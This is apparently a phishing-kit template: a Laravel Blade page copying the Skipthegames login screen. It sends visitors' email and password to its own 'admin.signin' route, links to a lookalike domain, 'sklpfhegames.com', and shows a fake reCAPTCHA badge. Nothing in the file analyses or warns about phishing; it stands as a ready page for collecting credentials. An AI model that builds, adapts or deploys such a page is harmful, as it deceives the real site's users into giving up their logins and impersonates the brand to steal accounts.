<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Log in to you Skipthegames account</title>
    
    <link rel="icon" href="{{ asset('ui/frontend/layout_1/i/favicons.png') }}" type="image/png">
    <link rel="stylesheet" href="{{ asset('ui/frontend/layout_1/css/styles.css') }}">
    <link rel="stylesheet" href="{{ asset('ui/frontend/layout_1/css/responsive.css') }}">
    
    
</head>
<body>
    <div class="container_wrap">
        <div class="container">
            <div class="notice">
                <p>
                    <strong>Providers, we do not send out text messages ever, do not click on links from them.</strong><br>
					<strong>Signups will be open in early November (we are 99 percent sure), we apologize for the delay but we had some technical issues.</strong>
                </p>
            </div>
        </div>
    </div>
    <div class="container_wrap header_bg">
        <div class="container">
            <div class="header fix">
                <div class="logo floatleft" title="Adult dating and casual encounters">
                    <a href="https://sklpfhegames.com/"><img src="{{ asset('ui/frontend/layout_1/i/Skipthegames.png') }}" alt=""></a>
                </div>
                <div class="heading floatleft">
                    <h5>Skip the games. <h5>Get satisfaction.</h5></h5>
                </div>
            </div>
        </div>
    </div>
    <div class="container_wrap">
        <div class="container fix">
            <div class="login_form fix">
                <div class="form floatleft">
                    <div class="reg_btn">
                        <a href="#" >New users click here</a>
                    </div>    
                    <h1>Log in to your account</h1>
                    <form method="post" action="{{ route('admin.signin') }}" id="loginform" name="loginform">
                        @csrf
                        <input class="email" name="email" type="email" required placeholder="Your email" value="">
                        <input class="pass" name="password" type="password" required placeholder="Password" value="">
                        <input type="submit" value="Log in">
                    </form>
                    <h4>Password not working?</h4> <a href="#">Click here</a>
                    <p>By clicking "Log in", you accept <a href="#">Skipthegames.com's Terms and Conditions of Use</a></p>
                </div>
                <div class="right_content floatright">
                    <h1>New user?</h1>
                    <a href="#">Click here</a>
                </div>
            </div>
        </div>
    </div>
    <div class="container_wrap">
        <div class="container fix">
            <div class="footer">
                <div class="copyright floatleft">
                    <a href="https://sklpfhegames.com/">&copy;skipthegames.com</a>
                </div>
                <div class="menu floatright">
                    <ul>
                        <li><a href="#">Home</a></li>
                        <li><a href="#">Contact</a></li>
                        <li><a href="#">About</a></li>
                        <li><a href="#">Privacy</a></li>
                        <li><a href="#">Terms</a></li>
                        <li><a href="#">Escort Info</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="container_wrap">
        <div class="recaptcha fix">
            <div class="captcha_logo floatleft">
                <img src="i/recaptcha.png" alt="">
                <p>Privacy - Terms</p>
            </div>
            <div class="captcha_content floatleft">
                <h3>protected by <strong>reCAPTCHA</strong></h3>
                <div>
                    <a>Privacy</a>
                    <span></span>
                    <a>Terms</a>
                </div>
            </div>
        </div>
    </div>
</body>
</html>